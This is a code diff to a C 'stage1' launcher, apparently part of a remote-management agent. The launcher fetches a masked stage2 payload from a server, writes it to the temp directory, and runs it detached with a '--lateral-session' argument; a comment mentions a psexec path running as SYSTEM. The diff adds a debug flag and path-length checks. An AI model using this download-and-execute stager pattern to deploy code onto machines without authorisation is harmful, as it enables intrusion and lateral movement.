@@ -18,6 +18,7 @@
  * Arguments:
  *   --stage   <32-char hex staging id>
  *   --session <target session id>
+ *   --debug-agent 1 (optional; write the separate debug agent filename)
  *
  * Flow:
  *   1. GET {BASE_URL}/tools/stage/{staging_id}
@@ -318,7 +319,8 @@ static const char *doStage(HINTERNET hSession,
                             DWORD secFlag,
                             const wchar_t *stagePath,
                             const wchar_t *stageIDW,
-                            const wchar_t *sessionIDW) {
+                            const wchar_t *sessionIDW,
+                            BOOL debugAgent) {
     /* 1. Fetch the masked stage2 payload */
     DWORD payloadLen = 0, httpStatus = 0;
     BYTE *payload = httpRequest(hSession, host, port, secFlag,
@@ -355,12 +357,24 @@ static const char *doStage(HINTERNET hSession,
      * launcher run needs no administrator rights (the psexec path runs as
      * SYSTEM, whose temp directory is writable as well). */
     wchar_t tmpDir[MAX_PATH];
-    if (!GetTempPathW(MAX_PATH, tmpDir))
+    DWORD tmpLen = GetTempPathW(MAX_PATH, tmpDir);
+    if (!tmpLen)
         lstrcpyW(tmpDir, L"C:\\Windows\\Temp\\");
+    else if (tmpLen >= MAX_PATH) {
+        HeapFree(GetProcessHeap(), 0, payload);
+        return "temporary directory path too long";
+    }
+
+    const wchar_t *agentName = debugAgent ? L"minimal-rmm-agent-debug.exe"
+                                         : L"minimal-rmm-agent.exe";
+    if (lstrlenW(tmpDir) + lstrlenW(agentName) >= MAX_PATH) {
+        HeapFree(GetProcessHeap(), 0, payload);
+        return "agent binary path too long";
+    }
 
     wchar_t agentPath[MAX_PATH];
     lstrcpyW(agentPath, tmpDir);
-    lstrcatW(agentPath, L"minimal-rmm-agent.exe");
+    lstrcatW(agentPath, agentName);
 
     HANDLE hFile = CreateFileW(agentPath,
                                GENERIC_WRITE, 0, NULL,
@@ -376,11 +390,12 @@ static const char *doStage(HINTERNET hSession,
     if (!writeOk || written != payloadLen) return "failed to write agent binary (incomplete)";
 
     /* 5. Launch detached: minimal-rmm-agent.exe --lateral-session <session_id> */
-    wchar_t cmdLine[MAX_PATH + 160];
+    wchar_t cmdLine[MAX_PATH + 192];
     lstrcpyW(cmdLine, L"\"");
     lstrcatW(cmdLine, agentPath);
     lstrcatW(cmdLine, L"\" --lateral-session ");
     lstrcatW(cmdLine, sessionIDW);
+    if (debugAgent) lstrcatW(cmdLine, L" --debug-agent 1");
 
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
@@ -428,6 +443,8 @@ static int runLauncher(void) {
     wchar_t stageID[256]   = {0};
     wchar_t sessionID[256] = {0};
     wchar_t customURL[2048] = {0};
+    BOOL debugAgent = FALSE;
+    BOOL invalidDebugAgent = FALSE;
 
     for (int i = 1; i + 1 < argc; i += 2) {
         if (lstrcmpW(argv[i], L"--stage") == 0)
@@ -436,8 +453,17 @@ static int runLauncher(void) {
             lstrcpynW(sessionID, argv[i + 1], 255);
         else if (lstrcmpW(argv[i], L"--base-url") == 0)
             lstrcpynW(customURL, argv[i + 1], 2047);
+        else if (lstrcmpW(argv[i], L"--debug-agent") == 0) {
+            if (lstrcmpW(argv[i + 1], L"1") != 0) invalidDebugAgent = TRUE;
+            else debugAgent = TRUE;
+        }
     }
     LocalFree(argv);
+
+    if (invalidDebugAgent) {
+        consolePrint("stage1: --debug-agent requires 1");
+        return 2;
+    }
 
     if (customURL[0] != L'\0') baseURL = customURL;
     if (!baseURL || baseURL[0] == L'\0') {
@@ -489,7 +515,7 @@ static int runLauncher(void) {
     }
 
     const char *err = doStage(hSession, host, port, secFlag,
-                               stagePath, stageID, sessionID);
+                               stagePath, stageID, sessionID, debugAgent);
     char statusMsg[320];
     if (err) {
         lstrcpyA(statusMsg, "stage1 failed: ");
